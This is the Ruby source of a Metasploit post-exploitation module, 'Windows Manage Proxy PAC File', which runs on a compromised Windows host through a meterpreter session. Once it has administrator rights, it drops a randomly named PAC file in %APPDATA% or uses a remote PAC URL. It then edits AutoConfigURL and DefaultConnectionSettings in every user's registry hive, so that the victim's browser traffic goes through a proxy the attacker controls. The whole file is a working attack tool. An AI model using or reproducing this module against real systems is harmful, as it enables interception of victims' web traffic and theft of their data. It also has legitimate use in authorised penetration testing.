##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Proxy PAC File',
			'Description'   => %q{
							This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC
						option a PAC file will be created in the victim host. It's also possible to especify a
						remote PAC file (REMOTE_PAC option) by providing the full URL. Ej: http://192.168.1.20/proxy.pac
						},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
			'References'    =>
						[
							[ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ]
						],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptPath.new('LOCAL_PAC',	[false,	'Local PAC file.' ]),
				OptString.new('REMOTE_PAC', [false,	'Remote PAC file.' ]),
			], self.class)
	end

	def run
		if not is_admin?
			print_error("You don't have enough privileges. Try getsystem.")
			return
		end

		if datastore['LOCAL_PAC'].nil? and datastore['REMOTE_PAC'].nil?
			print_error("You must set a remote or local PAC file.")
			return
		end

		if datastore['LOCAL_PAC'].nil?
			@remote = true
			print_status("Setting a remote PAC file ...")
			enable_proxy(datastore['REMOTE_PAC'])
		else
			print_status("Setting a local PAC file ...")
			pac_file = create_pac(datastore['LOCAL_PAC'])
			enable_proxy(pac_file) if pac_file
		end

	end

	def create_pac(local_pac)
		pac_file = expand_path("%APPDATA%") << "\\" << Rex::Text.rand_text_alpha((rand(8)+6)) << ".pac"
		conf_pac =""

		if ::File.exists?(local_pac)
			conf_pac << ::File.open(local_pac, "rb").read
		else
			print_error("Local PAC file not found.")
			return false
		end

		if write_file(pac_file,conf_pac)
			print_good ("PAC proxy configuration file written to #{pac_file}")
			return pac_file
		else
			print_error("There were problems creating the PAC proxy file.")
			return false
		end
	end

	def enable_proxy(pac)
		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"
			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
			value_defCon = "DefaultConnectionSettings"
			value_auto = "AutoConfigURL"
			file = (@remote) ? "#{pac}" : "file://#{pac}"
			begin
				registry_setvaldata(key,value_auto,file,"REG_SZ")
				value_con=registry_getvaldata(key + '\\' + 'Connections',value_defCon)
				binary_data=value_con.unpack('H*')[0]
				binary_data[16,2]='05'
				registry_setvaldata(key + '\\' + 'Connections',value_defCon,["%x" % binary_data.to_i(16)].pack("H*"),"REG_BINARY")
				print_good ("Proxy PAC enabled.")
			rescue::Exception => e
				print_status("There was an error setting the registry value: #{e.class} #{e}")
			end
		end
	end
end
